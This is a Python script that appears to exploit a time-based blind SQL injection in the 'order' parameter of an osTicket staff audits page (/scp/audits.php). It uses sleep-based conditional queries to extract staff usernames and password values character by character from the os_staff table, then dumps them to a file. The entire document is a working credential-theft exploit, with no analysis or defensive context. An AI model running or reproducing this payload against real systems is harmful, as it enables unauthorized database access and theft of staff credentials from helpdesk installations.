import requests
import urllib
import string

HOSTNAME = 'http://localhost'
cookie = {'OSTSESSID': '...'}
headers = {'User-Agent': '...'}
alphabet = string.ascii_lowercase + string.digits + '-_!'
offset = 0
nickname = ''

with open('dump.txt', 'w') as f:
    while True:
        password = ''
        position = 1
        found_letter = True
        while found_letter:
            found_letter = False
            for letter in alphabet:
                payload = "(select case when ((select substring(password," + str(position) + ",1) from os_staff LIMIT 1 OFFSET " + str(offset) + ")='" + letter + "') then sleep(0.3) else 1 end);"
                result = requests.get(HOSTNAME + '/scp/audits.php?&type=S&state=All&order=ASC,' + urllib.parse.quote(payload) +'--&sort=timestamp&_pjax=%23pjax-container', cookies=cookie, headers=headers)
                if result.elapsed.total_seconds() > 2:
                    password += letter
                    found_letter = True
                    break
            position += 1

        if not password:
            break

        position = 1
        found_letter = True
        while found_letter:
            found_letter = False
            for letter in alphabet:
                payload = "(select case when ((select substring(username," + str(position) + ",1) from os_staff LIMIT 1 OFFSET " + str(offset) + ")='" + letter + "') then sleep(0.3) else 1 end);"
                result = requests.get(HOSTNAME + '/scp/audits.php?&type=S&state=All&order=ASC,' + urllib.parse.quote(payload) +'--&sort=timestamp&_pjax=%23pjax-container', cookies=cookie, headers=headers)
                if result.elapsed.total_seconds() > 2:
                    nickname += letter
                    found_letter = True
                    break
            position += 1

        output = f"{nickname}::{password}\n"
        f.write(output)
        print(output, end='')
        nickname = ''
        offset += 1
